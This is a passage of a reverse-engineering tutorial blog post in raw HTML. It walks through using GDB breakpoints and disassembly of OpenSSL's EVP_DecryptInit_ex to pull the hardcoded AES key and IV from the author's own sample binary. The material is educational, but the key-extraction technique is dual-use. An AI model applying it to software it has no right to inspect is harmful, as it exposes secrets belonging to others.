</span><span class="line"><span class="nf">Reading</span> <span class="nv">symbols</span> <span class="nv">from</span> <span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">i686</span><span class="o">/</span><span class="nv">cmov</span><span class="o">/</span><span class="nv">libc.so.6...</span><span class="p">(</span><span class="nv">no</span> <span class="nv">debugging</span> <span class="nv">symbols</span> <span class="nv">found</span><span class="p">)</span><span class="nv">...done.</span>
</span><span class="line"><span class="nf">Loaded</span> <span class="nv">symbols</span> <span class="nv">for</span> <span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">i686</span><span class="o">/</span><span class="nv">cmov</span><span class="o">/</span><span class="nv">libc.so.6</span>
</span><span class="line"><span class="nf">Reading</span> <span class="nv">symbols</span> <span class="nv">from</span> <span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">i686</span><span class="o">/</span><span class="nv">cmov</span><span class="o">/</span><span class="nv">libdl.so.2...</span><span class="p">(</span><span class="nv">no</span> <span class="nv">debugging</span> <span class="nv">symbols</span> <span class="nv">found</span><span class="p">)</span><span class="nv">...done.</span>
</span><span class="line"><span class="nf">Loaded</span> <span class="nv">symbols</span> <span class="nv">for</span> <span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">i686</span><span class="o">/</span><span class="nv">cmov</span><span class="o">/</span><span class="nv">libdl.so.2</span>
</span><span class="line"><span class="nf">Reading</span> <span class="nv">symbols</span> <span class="nv">from</span> <span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">libz.so.1...</span><span class="p">(</span><span class="nv">no</span> <span class="nv">debugging</span> <span class="nv">symbols</span> <span class="nv">found</span><span class="p">)</span><span class="nv">...done.</span>
</span><span class="line"><span class="nf">Loaded</span> <span class="nv">symbols</span> <span class="nv">for</span> <span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">libz.so.1</span>
</span><span class="line"><span class="nf">Ciphertext</span> <span class="nv">is</span><span class="p">:</span>
</span><span class="line"><span class="err">0000</span> <span class="err">-</span> <span class="err">51</span> <span class="err">34</span> <span class="err">3</span><span class="nf">f</span> <span class="mi">21</span> <span class="mi">87</span> <span class="mi">5</span><span class="nv">d</span> <span class="mi">4</span><span class="nv">e</span> <span class="nv">f6</span><span class="o">-</span><span class="mi">18</span> <span class="mi">1</span><span class="nv">d</span> <span class="nv">c6</span> <span class="mi">6</span><span class="nv">d</span> <span class="mi">41</span> <span class="nv">c1</span> <span class="mi">12</span> <span class="nv">ae</span>   <span class="nv">Q4?</span><span class="err">!</span><span class="nv">.</span><span class="p">]</span><span class="nv">N....mA...</span>
</span><span class="line"><span class="err">0010</span> <span class="err">-</span> <span class="nf">e0</span> <span class="nv">a7</span> <span class="nv">de</span> <span class="nv">a0</span> <span class="nv">fa</span> <span class="nv">b9</span> <span class="mi">6</span><span class="nv">c</span> <span class="nv">b0</span><span class="o">-</span><span class="mi">91</span> <span class="mi">5</span><span class="nv">e</span> <span class="mi">21</span> <span class="nv">c6</span> <span class="nv">d3</span> <span class="mi">90</span> <span class="mi">96</span> <span class="mi">36</span>   <span class="nv">......l..</span><span class="o">^</span><span class="err">!</span><span class="nv">....6</span>
</span><span class="line"><span class="err">0020</span> <span class="err">-</span> <span class="err">70</span> <span class="err">7</span><span class="nf">b</span> <span class="nv">ec</span> <span class="mi">69</span> <span class="mi">89</span> <span class="nv">e1</span> <span class="nv">bc</span> <span class="mi">0</span><span class="nv">a</span><span class="o">-</span><span class="mi">2</span><span class="nv">c</span> <span class="mi">61</span> <span class="nv">f4</span> <span class="nv">c6</span> <span class="mi">26</span> <span class="mi">61</span> <span class="mi">5</span><span class="nv">f</span> <span class="mi">2</span><span class="nv">e</span>   <span class="nv">p</span><span class="err">{</span><span class="nv">.i....</span><span class="p">,</span><span class="nv">a..</span><span class="o">&amp;</span><span class="nv">a_.</span>
</span><span class="line">
</span><span class="line"><span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="nv">Reading</span> <span class="nv">in</span> <span class="nv">symbols</span> <span class="nv">for</span> <span class="nv">AES</span><span class="o">-</span><span class="nv">OpenSSL.c...done.</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7ed3a20</span> <span class="nv">in</span> <span class="nv">EVP_DecryptInit_ex</span> <span class="p">()</span> <span class="nv">from</span> <span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">i686</span><span class="o">/</span><span class="nv">cmov</span><span class="o">/</span><span class="nv">libcrypto.so.1.0.0</span>
</span><span class="line"><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nb">di</span><span class="nv">sass</span>    <span class="c1">; disassembling the function</span>
</span><span class="line"><span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">EVP_DecryptInit_ex</span><span class="p">:</span>
</span><span class="line"><span class="err">=&gt;</span> <span class="err">0</span><span class="nf">xb7ed3a20</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span> <span class="nv">push</span>   <span class="nb">ebx</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a21</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x28</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a24</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x40</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a28</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0xb7e510db</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a2d</span> <span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">add</span>    <span class="nb">ebx</span><span class="p">,</span><span class="mh">0xe65c7</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a33</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">],</span><span class="mh">0x0</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a3b</span> <span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x10</span><span class="p">],</span><span class="nb">eax</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a3f</span> <span class="o">&lt;+</span><span class="mi">31</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x3c</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a43</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">],</span><span class="nb">eax</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a47</span> <span class="o">&lt;+</span><span class="mi">39</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x38</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a4b</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="nb">eax</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a4f</span> <span class="o">&lt;+</span><span class="mi">47</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x34</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a53</span> <span class="o">&lt;+</span><span class="mi">51</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="nb">eax</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a57</span> <span class="o">&lt;+</span><span class="mi">55</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x30</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a5b</span> <span class="o">&lt;+</span><span class="mi">59</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a5e</span> <span class="o">&lt;+</span><span class="mi">62</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0xb7e50660</span> <span class="o">&lt;</span><span class="nv">EVP_CipherInit_ex@plt</span><span class="o">&gt;</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a63</span> <span class="o">&lt;+</span><span class="mi">67</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x28</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a66</span> <span class="o">&lt;+</span><span class="mi">70</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">pop</span>    <span class="nb">ebx</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a67</span> <span class="o">&lt;+</span><span class="mi">71</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">ret</span>
</span><span class="line"><span class="nf">End</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">dump.</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>We can see <code>EVP_CipherInit_ex</code> called at <code>0xb7ed3a5e</code>. Let’s put a breakpoint there (right before function call) and look at its arguments.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>running in gdb with debug info 2 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">b</span><span class="o">*</span><span class="mh">0xb7ed3a5e</span>
</span><span class="line"><span class="nf">Breakpoint</span> <span class="mi">2</span> <span class="nv">at</span> <span class="mh">0xb7ed3a5e</span>
</span><span class="line"><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">c</span>
</span><span class="line"><span class="nf">Continuing.</span>
</span><span class="line">
</span><span class="line"><span class="nf">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0xb7ed3a5e</span> <span class="nv">in</span> <span class="nv">EVP_DecryptInit_ex</span> <span class="p">()</span> <span class="nv">from</span> <span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">i386</span><span class="o">-</span><span class="nv">linux</span><span class="o">-</span><span class="nv">gnu</span><span class="o">/</span><span class="nv">i686</span><span class="o">/</span><span class="nv">cmov</span><span class="o">/</span><span class="nv">libcrypto.so.1.0.0</span>
</span><span class="line"><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nb">di</span><span class="nv">sass</span>
</span><span class="line"><span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">EVP_DecryptInit_ex</span><span class="p">:</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a20</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">ebx</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a21</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x28</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a24</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x40</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a28</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0xb7e510db</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a2d</span> <span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">ebx</span><span class="p">,</span><span class="mh">0xe65c7</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a33</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x14</span><span class="p">],</span><span class="mh">0x0</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a3b</span> <span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x10</span><span class="p">],</span><span class="nb">eax</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a3f</span> <span class="o">&lt;+</span><span class="mi">31</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x3c</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a43</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">],</span><span class="nb">eax</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a47</span> <span class="o">&lt;+</span><span class="mi">39</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x38</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a4b</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="nb">eax</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a4f</span> <span class="o">&lt;+</span><span class="mi">47</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x34</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a53</span> <span class="o">&lt;+</span><span class="mi">51</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="nb">eax</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a57</span> <span class="o">&lt;+</span><span class="mi">55</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x30</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a5b</span> <span class="o">&lt;+</span><span class="mi">59</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span><span class="nb">eax</span>
</span><span class="line"><span class="err">=&gt;</span> <span class="err">0</span><span class="nf">xb7ed3a5e</span> <span class="o">&lt;+</span><span class="mi">62</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0xb7e50660</span> <span class="o">&lt;</span><span class="nv">EVP_CipherInit_ex@plt</span><span class="o">&gt;</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a63</span> <span class="o">&lt;+</span><span class="mi">67</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x28</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a66</span> <span class="o">&lt;+</span><span class="mi">70</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">pop</span>    <span class="nb">ebx</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7ed3a67</span> <span class="o">&lt;+</span><span class="mi">71</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">ret</span>
</span><span class="line"><span class="nf">End</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">dump.</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>We can see the arguments loaded from memory to eax and then pushed to the stack (esp is the stack pointer and points to the top of the stack at all times). We are in a Linux 32-bit OS so arguments (or parameters whatever) are pushed to the stack from <a href="http://duartes.org/gustavo/blog/post/journey-to-the-stack/">right to left</a> (almost the same in 32-bit Windows systems). Here is what it looks like right before the call instruction:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>EVP_DecryptInit_ex arguments </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
</pre></td><td class="code"><pre><code class="cpp"><span class="line"><span class="kt">int</span> <span class="n">EVP_DecryptInit_ex</span><span class="p">(</span>
</span><span class="line"><span class="n">EVP_CIPHER_CTX</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span>    <span class="o">&lt;==</span> <span class="p">[</span><span class="n">esp</span><span class="p">]</span>
</span><span class="line"><span class="k">const</span> <span class="n">EVP_CIPHER</span> <span class="o">*</span><span class="n">type</span><span class="p">,</span> <span class="o">&lt;==</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>
</span><span class="line"><span class="n">ENGINE</span> <span class="o">*</span><span class="n">impl</span><span class="p">,</span>           <span class="o">&lt;==</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
</span><span class="line"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span>     <span class="o">&lt;==</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
</span><span class="line"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">iv</span>       <span class="o">&lt;==</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x10</span><span class="p">]</span>
</span><span class="line"><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>We can print the values of both key and IV. To do this in GDB we need to use this command <code>x/s *((char **) ( $esp+0x10 ))</code>. The s switch tells GDB to print the result as a string. <code>$esp+0x10</code> is a pointer that points to a location on the stack. In that location we have a <code>char *</code> which is another pointer to a string, so we need to dereference it twice (hence the <code>char **</code>). And finally to print it using the <code>s</code> switch we need to make it a string (e.g. <code>char *</code>) so we will use the first *. And it works.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>finding key and IV in gdb with debug info </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="cpp"><span class="line"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span> <span class="p">(</span> <span class="err">$</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x10</span> <span class="p">))</span>
</span><span class="line"><span class="mh">0x8048d71</span><span class="o">:</span>	 <span class="s">&quot;d36a4bf2e6dd9c68&quot;</span>
</span><span class="line"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span> <span class="p">(</span> <span class="err">$</span><span class="n">esp</span><span class="o">+</span><span class="mh">0xc</span> <span class="p">))</span>
</span><span class="line"><span class="mh">0x8048d50</span><span class="o">:</span>	 <span class="s">&quot;ee12c03ceacdfb5d4c0e67c8f5ab3362&quot;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><span class="caption-wrapper"><img class="caption" src="http://parsiya.net/images/2015/tales1/Queen-Not-Amused.jpg" width="" height="" title="Her Majesty is bored because of GDB" /><span class="caption-text">Her Majesty is bored because of GDB</span></span></p>

<h4 id="using-gdb-without-debug-info">2.5 Using GDB without Debug Info</h4>
<p>Our example is in a controlled environment, so we were able to build the binary with debug info. But in a real world scenario we do not have this luxury. In this section I will discuss how to get to  <code>EVP_DecryptInit_ex</code> without debug info.</p>

<p>First we have to build our binary without  debug info, just remove the <code>-ggdb</code> switch to get <code>gcc -o sampleaes-nodebug AES-OpenSSL.c -lcrypto</code>. Now how do we find the location of <code>EVP_DecryptInit_ex</code> call?</p>

<p>Remember the following line in the original ltrace output.
<code>[0x8048b0b] EVP_DecryptInit_ex(0x90bdce0, 0xb7735040, 0, 0x8048d50, 0x8048d71) = 1</code></p>

<p>We used the <code>i</code> switch to print the value of instruction pointer after the call. This is our entry point. We will debug the binary in GDB and set up a breakpoint at <code>0x8048b0b</code> and see what happens.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>running in gdb without debug info 1 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nf">$</span> <span class="nv">gdb</span> <span class="nv">.</span><span class="o">/</span><span class="nv">sampleaes</span><span class="o">-</span><span class="nv">nodebug</span> <span class="o">-</span><span class="nv">q</span>
</span><span class="line"><span class="nf">Reading</span> <span class="nv">symbols</span> <span class="nv">from</span> <span class="o">/</span><span class="nv">root</span><span class="o">/</span><span class="nv">Desktop</span><span class="o">/</span><span class="nv">kek</span><span class="o">/</span><span class="nv">sampleaes</span><span class="o">-</span><span class="nv">nodebug...</span><span class="p">(</span><span class="nv">no</span> <span class="nv">debugging</span> <span class="nv">symbols</span> <span class="nv">found</span><span class="p">)</span><span class="nv">...done.</span>
</span><span class="line"><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">b</span> <span class="o">*</span><span class="mh">0x8048b0b</span>
</span><span class="line"><span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="nv">at</span> <span class="mh">0x8048b0b</span>
</span><span class="line"><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">run</span>
</span><span class="line"><span class="nf">Starting</span> <span class="nv">program</span><span class="p">:</span> <span class="o">/</span><span class="nv">root</span><span class="o">/</span><span class="nv">Desktop</span><span class="o">/</span><span class="nv">kek</span><span class="o">/</span><span class="nv">sampleaes</span><span class="o">-</span><span class="nv">nodebug</span>
</span><span class="line"><span class="nf">Ciphertext</span> <span class="nv">is</span><span class="p">:</span>
</span><span class="line"><span class="err">0000</span> <span class="err">-</span> <span class="err">51</span> <span class="err">34</span> <span class="err">3</span><span class="nf">f</span> <span class="mi">21</span> <span class="mi">87</span> <span class="mi">5</span><span class="nv">d</span> <span class="mi">4</span><span class="nv">e</span> <span class="nv">f6</span><span class="o">-</span><span class="mi">18</span> <span class="mi">1</span><span class="nv">d</span> <span class="nv">c6</span> <span class="mi">6</span><span class="nv">d</span> <span class="mi">41</span> <span class="nv">c1</span> <span class="mi">12</span> <span class="nv">ae</span>   <span class="nv">Q4?</span><span class="err">!</span><span class="nv">.</span><span class="p">]</span><span class="nv">N....mA...</span>
</span><span class="line"><span class="err">0010</span> <span class="err">-</span> <span class="nf">e0</span> <span class="nv">a7</span> <span class="nv">de</span> <span class="nv">a0</span> <span class="nv">fa</span> <span class="nv">b9</span> <span class="mi">6</span><span class="nv">c</span> <span class="nv">b0</span><span class="o">-</span><span class="mi">91</span> <span class="mi">5</span><span class="nv">e</span> <span class="mi">21</span> <span class="nv">c6</span> <span class="nv">d3</span> <span class="mi">90</span> <span class="mi">96</span> <span class="mi">36</span>   <span class="nv">......l..</span><span class="o">^</span><span class="err">!</span><span class="nv">....6</span>
